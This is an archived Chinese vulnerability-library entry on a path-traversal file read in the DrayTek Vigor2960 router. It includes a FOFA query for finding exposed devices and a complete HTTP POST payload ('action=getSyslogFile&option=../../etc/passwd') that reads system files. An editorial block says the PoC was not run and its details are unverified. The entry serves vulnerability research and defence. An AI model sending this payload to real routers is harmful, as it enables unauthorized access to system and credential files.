---
source: "wy876 漏洞文库"
id: "vw-3b1d7db327505203f0a1ffb9"
entity_id: "ve-3b1d7db327505203f0a1ffb9"
schema_version: "1"
fofa_unverified: "title="
title: "Draytek Vigor 2960 路由器mainfunction任意文件读取漏洞"
product: "DrayTek Vigor2960"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "正文v1.5.1.4，影响节漏版本；无认证说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/DrayTek/DraytekVigor2960%E8%B7%AF%E7%94%B1%E5%99%A8mainfunction%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hg8ng5hsagblmd2p"
source_status: "recorded"
---

# Draytek Vigor 2960 路由器mainfunction任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：DrayTek Vigor2960
- 本文讨论：mainfunction getSyslogFile路径遍历
- 版本、权限与配置前提：正文v1.5.1.4，影响节漏版本；无认证说明
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- fofa元数据title=残缺
- Content-Length94与短体不符；无响应/判定证据
- 同mainfunction端点不同action，不应与keyPath命令注入合并
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 认证和修复版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
DrayTek是中国台湾的一家网络设备制造商，其产品包括VPN路由器、管理型交换机、无线AP和管理系统等，并被中小型企业广泛使用。Vigor2960 v1.5.1.4 存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。

# 二、影响版本
+ Draytek Vigor 2960 路由器

# 三、资产测绘
+ fofa`title="Vigor 2960"`
+ 特征


# 四、漏洞复现
```http
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 
Connection: close
Content-Length: 94
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

action=getSyslogFile&option=../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hg8ng5hsagblmd2p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
